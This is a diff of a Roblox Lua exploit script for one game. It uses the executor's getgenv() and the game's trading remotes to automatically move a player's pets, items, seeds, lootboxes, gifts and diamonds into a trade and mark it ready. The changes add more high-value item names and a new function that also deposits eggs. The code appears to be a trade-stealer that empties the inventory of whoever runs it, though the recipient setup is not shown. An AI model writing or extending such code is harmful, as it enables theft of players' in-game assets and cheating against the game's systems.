@@ -42,7 +42,10 @@ if game.PlaceId == 8737899170 then
         "Lucky Tile",
         "Good vs Evil Gift",
         "Rave Gift",
-        "Millionaire Bucks"
+        "Millionaire Bucks",
+        "Pet Cube",
+        "Ultra Pet Cube",
+        "Huge Machine Egg 4"
 }
     local const = require(game.ReplicatedStorage.Library.Directory)
     local library = require(game.ReplicatedStorage.Library.Client.Save)
@@ -153,7 +156,7 @@ if game.PlaceId == 8737899170 then
                             [1] = GetTradeID(),
                             [2] = "Pet",
                             [3] = i,
-                            [4] = v._am
+                            [4] = v._am or 1
                         }
                         game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                     end
@@ -193,7 +196,7 @@ if game.PlaceId == 8737899170 then
                                 [1] = GetTradeID(),
                                 [2] = "Misc",
                                 [3] = i,
-                                [4] = v._am
+                                [4] = v._am or 1
                             }
                             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                         end
@@ -215,7 +218,7 @@ if game.PlaceId == 8737899170 then
                                 [1] = GetTradeID(),
                                 [2] = "Seed",
                                 [3] = i,
-                                [4] = v._am
+                                [4] = v._am or 1
                             }
                             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                         end
@@ -236,7 +239,29 @@ if game.PlaceId == 8737899170 then
                                 [1] = GetTradeID(),
                                 [2] = "Lootbox",
                                 [3] = i,
-                                [4] = v._am
+                                [4] = v._am or 1
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+
+    local function DepositEggInTrade()
+        if save.Inventory.Egg ~= nil then
+            for i,v in pairs(save.Inventory.Egg) do
+                if v._am ~= nil then
+                    for _, itemName in pairs(getgenv().ItemToTrade) do
+                        if v.id == itemName then
+                            wait(0.1)
+                            local args = {
+                                [1] = GetTradeID(),
+                                [2] = "Egg",
+                                [3] = i,
+                                [4] = v._am or 1
                             }
                             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
                         end
@@ -293,6 +318,7 @@ if game.PlaceId == 8737899170 then
                 DepositItemInTrade()
                 DepositSeedInTrade()
                 DepositGiftInTrade()
+                DepositEggInTrade()
                 DepositDiamondsInTrade()
                 ReadyTrade()
                 wait(1)
